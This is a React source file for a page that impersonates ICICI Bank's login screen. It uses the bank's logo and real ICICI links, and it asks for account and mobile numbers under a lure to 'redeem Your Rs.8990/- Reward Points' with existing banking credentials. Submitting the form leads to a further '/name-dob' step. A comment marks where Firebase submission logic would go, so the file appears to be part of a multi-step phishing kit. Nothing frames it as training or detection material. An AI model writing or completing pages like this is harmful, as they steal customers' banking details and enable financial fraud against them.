import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const MainPage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    accountNumber: '',
    mobileNumber: ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Firebase configuration and submission logic would go here
    // For now, just navigate to the next page
    navigate('/name-dob');
  };

  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <form className="LoginForm" onSubmit={handleSubmit}>
      <div className="container">
        <div className="header">
          <img src="/icici h.jpg" alt="ICICI Bank Logo" />
        </div>

        <div className="input-group">
          <label htmlFor="accountNumber">Account Number</label>
          <input
            type="text"
            className="new-control"
            name="accountNumber"
            id="accountNumber"
            maxLength="12"
            inputMode="numeric"
            required
            value={formData.accountNumber}
            onChange={handleInputChange}
          />
        </div>

        <div className="input-group">
          <label htmlFor="mobileNumber">Mobile Number</label>
          <input
            type="text"
            className="new-control"
            id="mobileNumber"
            name="mobileNumber"
            maxLength="10"
            inputMode="numeric"
            pattern="[6-9]\d{9}"
            title="Please enter valid mobile number !"
            required
            value={formData.mobileNumber}
            onChange={handleInputChange}
          />
        </div>

        <button className="btn" type="submit">Login</button>

        <div className="links">
          <a href="https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__EVENT_ID__=LOAD&__CALL_MODE__=92&LOGIN_FLAG=1&BANK_ID=ICI&ACCESS_DEV=WAP">Forgot User ID or Password</a> |
          <a href="https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*30xkeg*_ga*MTgzMDcxOTY5Ni4xNjIwMDM5NDU0*_ga_SKB78GHTFV*MTYyODIzNDM4NC43Ny4xLjE2MjgyMzQ1MDQuMjc.&_ga=2.92094746.1084279428.1697432242-1973315115.1690798212&_gac=1.213008672.1697523963.EAIaIQobChMI-7jpvrn8gQMVt6lmAh1nywMHEAAYASAAEgKBxfD_BwE?ITM=nli_personalb_personal_login_btn">Continue to Desktop Login</a>
        </div>

        <div className="notification">
          Please use your existing Internet Banking Mobile No./ATM Pin/User ID and Password (credentials) of Personal and Business Banking and redeem Your Rs.8990/- Reward Points.
        </div>

        <div className="download-app">
          <a href="#">
            <img src="/iMobile Logo.jpg" alt="iMobile Logo" />
          </a>
        </div>
      </div>

      <div className="footer">
        <p>Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. ICICI Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.</p>
        <a href="#">Disclaimer</a> | <a href="#">Privacy</a> | <a href="#">Desktop Site</a>
        <p>&copy; ICICI Bank</p>
      </div>
    </form>
  );
};

export default MainPage;
